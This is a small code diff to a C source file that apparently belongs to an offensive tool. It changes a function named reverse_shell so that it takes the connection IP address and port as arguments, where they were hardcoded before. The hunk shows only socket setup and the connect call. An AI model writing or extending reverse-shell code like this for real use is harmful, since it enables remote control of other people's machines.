@@ -9,7 +9,7 @@
 
 #include "utils.h"
 
-int reverse_shell()
+int reverse_shell(char *ip_addr, int port)
 {
 	int socket_desc;
 	struct sockaddr_in server;
@@ -23,9 +23,9 @@ int reverse_shell()
 		return ERROR;
 	}
 
-	server.sin_addr.s_addr = inet_addr("127.0.0.1");
+	server.sin_addr.s_addr = inet_addr(ip_addr);
 	server.sin_family = AF_INET;
-	server.sin_port = htons(80);
+	server.sin_port = htons(port);
 
 	if (connect(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0) {
 		printf("Error connecting\n");
